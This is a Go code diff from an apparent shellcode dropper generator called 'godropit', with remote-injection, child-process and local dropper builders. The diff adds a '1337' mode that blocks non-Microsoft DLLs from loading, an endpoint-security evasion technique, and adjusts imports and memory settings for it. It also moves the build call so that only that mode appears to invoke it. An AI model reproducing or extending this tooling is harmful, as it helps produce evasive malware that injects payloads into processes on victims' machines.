@@ -5,6 +5,7 @@ import (
 	"log"
 	"os"
 	"path/filepath"
+	"strings"
 
 	"godropit/internal/godroplib/child"
 	"godropit/internal/godroplib/local"
@@ -16,6 +17,8 @@ import (
 )
 
 func NewRemoteDropper(input, output, domain, dropname, pid string, delay int, sgn, dll, arch bool) {
+	dropname = check(dropname)
+
 	var remoteDrop Dropper
 	var Dtype DtypeRemote
 	var err error
@@ -36,6 +39,7 @@ func NewRemoteDropper(input, output, domain, dropname, pid string, delay int, sg
 }
 
 func NewChildDropper(input, output, domain, dropname, proc, args string, delay int, sgn, dll, arch bool) {
+	dropname = check(dropname)
 	var childDrop Dropper
 	var Dtype DtypeChild
 	var err error
@@ -57,8 +61,9 @@ func NewChildDropper(input, output, domain, dropname, proc, args string, delay i
 }
 
 func NewLocalDropper(input, output, domain, dropname string, delay int, sgn, dll, arch, hold bool) {
+	dropname = check(dropname)
 	var localDrop Dropper
-	localDrop.Dlls, localDrop.Inject, localDrop.Import, localDrop.Extra = local.SelectLocal()
+	localDrop.Dlls, localDrop.Inject, localDrop.Import, localDrop.Extra = local.SelectLocal(Leet)
 	localDrop.Delay = delay
 	localDrop.Arch = arch
 	localDrop.Shared = dll
@@ -75,8 +80,18 @@ func NewLocalDropper(input, output, domain, dropname string, delay int, sgn, dll
 }
 
 func newDropper(goDrop Dropper, dropname, domain, input, output string, sgn bool) {
+	if Leet {
+		color.Cyan("Note: 1337 Droppers block nonms dlls from loading in the process.\nThis can sometimes break some payloads. Either modify or don't use 1337 mode.")
+		goDrop.LeetImp = LeetImports
+		goDrop.BlockNonMs = BlockNonMs
+		goDrop.MemCom = ""
+		dropname = strings.ReplaceAll(dropname, "hunter2", "")
+	} else {
+		goDrop.LeetImp = " "
+		goDrop.BlockNonMs = " "
+		goDrop.MemCom = MemCom
 
-	dropname = check(dropname)
+	}
 
 	var shellcode dropfmt.DropFmt
 
@@ -153,10 +168,8 @@ func newDropper(goDrop Dropper, dropname, domain, input, output string, sgn bool
 	wd, _ := os.Getwd()
 
 	if Leet {
-
+		buildFileGo(output, dropfilename, goDrop.Shared, goDrop.Arch)
 	}
-
-	buildFileGo(output, dropfilename, goDrop.Shared, goDrop.Arch)
 
 	os.Chdir(wd)
 
